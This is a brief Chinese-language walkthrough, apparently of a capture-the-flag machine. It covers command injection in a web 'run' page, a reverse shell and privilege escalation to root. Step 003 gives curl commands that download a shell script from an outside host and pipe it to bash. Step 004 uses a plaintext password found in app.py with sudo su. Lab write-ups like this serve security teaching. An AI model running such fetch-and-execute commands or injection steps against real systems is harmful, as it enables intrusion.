# 003 RCE 命令注入 curl 反弹 shell

访问 run 界面，加上 secret_key 字段

返回了比较奇怪的字符串，直接搜索发现这是 curl 命令执行后的回显

相当于在 curl 后拼接命令，但是管道符号不起作用

后面在加一个分号时成功得到了 whoami 信息，是 RCE 漏洞

发现可以注入，尝试往其中写入 shell：
curl http://www.chentuo.asia/shell.sh | bash;

curl http://www.chentuo.asia/shell.sh | sh;

登陆成功，拿到了 patrick 的权限

# 004 pkexec、sudo su 提权

服务器存在 s 权限的 pkexec，并且有 gcc 编译器

看看有没有其他的提权方式，shutdown 可以无密码使用但没法提权
调用 root 权限的时候是需要 patrick 的密码的，但是我们没密码

找找系统中的文件，看有没有线索，最后在～/flask_blog/app.py 文件中找到：
Sudo su 通过 patrick 的密码来提到 root
测试后发现正确的是 NOreasonableDOUBTthisPASSWORDisGOOD

提权成功，拿到了 root 权限
